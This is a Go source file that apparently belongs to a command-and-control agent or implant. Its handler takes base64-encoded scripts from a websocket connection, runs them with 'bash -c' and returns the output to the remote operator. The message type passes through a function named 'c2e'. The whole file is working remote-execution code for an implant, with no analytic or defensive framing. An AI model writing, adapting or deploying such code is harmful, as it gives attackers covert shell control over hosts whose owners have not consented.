//go:build !windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os/exec"
	"sync"

	"github.com/gorilla/websocket"
)

type MemExecRequest struct {
	Mode    string `json:"mode"`
	Code    string `json:"code"`
	Timeout int    `json:"timeout"`
}

func handleMemExec(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	var req MemExecRequest
	if err := json.Unmarshal(msg.Payload, &req); err != nil {
		sendMemExecResult(conn, writeMu, msg.ID, "", fmt.Sprintf("parse error: %v", err))
		return
	}
	if req.Mode != "ps1" && req.Mode != "bash" {
		sendMemExecResult(conn, writeMu, msg.ID, "", "unsupported mode on linux: "+req.Mode)
		return
	}
	scriptBytes, err := base64.StdEncoding.DecodeString(req.Code)
	if err != nil {
		sendMemExecResult(conn, writeMu, msg.ID, "", "base64 decode failed")
		return
	}
	cmd := exec.Command("bash", "-c", string(scriptBytes))
	out, err := cmd.CombinedOutput()
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}
	sendMemExecResult(conn, writeMu, msg.ID, string(out), errMsg)
}

func sendMemExecResult(conn *websocket.Conn, writeMu *sync.Mutex, id, output, errMsg string) {
	result := map[string]interface{}{"output": output, "error": errMsg}
	payload, _ := json.Marshal(result)
	resp, _ := json.Marshal(AgentMessage{Type: c2e("mem_exec_result"), ID: id, Payload: payload})
	writeMu.Lock()
	defer writeMu.Unlock()
	if err := conn.WriteMessage(websocket.TextMessage, resp); err != nil {
		log.Printf("[mem_exec] send result failed: %v", err)
	}
}
